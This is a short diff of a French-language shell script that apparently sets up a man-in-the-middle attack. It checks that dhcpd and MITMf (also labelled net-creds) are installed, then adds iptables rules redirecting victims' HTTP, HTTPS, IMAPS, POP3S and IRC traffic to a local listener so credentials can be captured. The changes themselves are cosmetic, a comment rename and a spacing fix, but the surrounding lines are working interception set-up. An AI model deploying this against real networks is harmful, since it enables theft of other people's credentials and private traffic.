@@ -28,7 +28,7 @@ if [[ ! -x /usr/sbin/dhcpd ]];then
     exit_fn
   fi
 fi
-#Net-Creds
+#MITMf
 if [[ ! -x /etc/MITMf ]];then
   echo -e "$warn\nVous devez installer net-creds"
   sleep 1
@@ -114,7 +114,7 @@ iptables --table nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to
 iptables --table nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports $listenport #HTTPS
 iptables --table nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports $listenport #IMAPS
 iptables --table nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports $listenport #POP3S
-iptables --table nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports $listenport # IRC
+iptables --table nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports $listenport #IRC
 sleep 3
 
 # DHCP
